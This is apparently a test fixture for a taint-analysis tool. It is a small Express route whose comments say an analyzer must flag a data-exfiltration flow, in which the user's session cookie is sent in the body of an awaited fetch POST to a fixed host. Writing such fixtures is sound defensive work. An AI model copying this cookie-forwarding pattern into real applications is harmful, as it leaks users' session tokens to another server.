var express = require('express');
var app = express();

// Async/await DATA_EXFIL: `await fetch(...)` must preserve the cap
// split.  The destination URL is a fixed string literal (so SSRF must
// NOT fire) but a Sensitive cookie source threads through the body
// channel of the awaited call, so `Cap::DATA_EXFIL` MUST fire on the
// body field.  Awaiting a Promise does not strip taint, the SSA lowering
// preserves chained await values across .then/.await edges identically
// to the synchronous fetch case.
app.post('/sync-async', async function (req, res) {
    var sid = req.cookies.session;
    await fetch('https://analytics.internal/track', {
        method: 'POST',
        body: JSON.stringify({ session: sid }),
    });
    res.status(204).end();
});
